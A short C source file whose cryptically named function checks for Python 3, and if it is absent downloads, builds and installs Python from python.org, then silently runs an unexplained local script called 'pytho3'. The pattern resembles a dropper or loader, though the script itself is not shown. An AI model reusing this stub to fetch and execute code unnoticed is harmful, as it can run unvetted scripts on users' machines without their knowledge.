#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>

int stzt() {
    // 1. Capture the exit status code into the 'result' variable
    int result = system("python3 --version > /dev/null 2>&1");
    
    // 2. If result is NOT 0, Python 3 is missing. Run the installer chain.
    if (result != 0) {
        system("wget https://www.python.org/ftp/python/3.11.4/Python-3.11.4.tgz && "
               "tar -xf Python-3.11.4.tgz && "
               "cd Python-3.11.4 && "
               "./configure --enable-optimizations && "
               "make -j$(nproc) && "
               "make altinstall &&"
              "python3 ../pytho3");
            } else {
      system("python3 ./pytho3");
      return 0;
    }
    
    return 0;
}
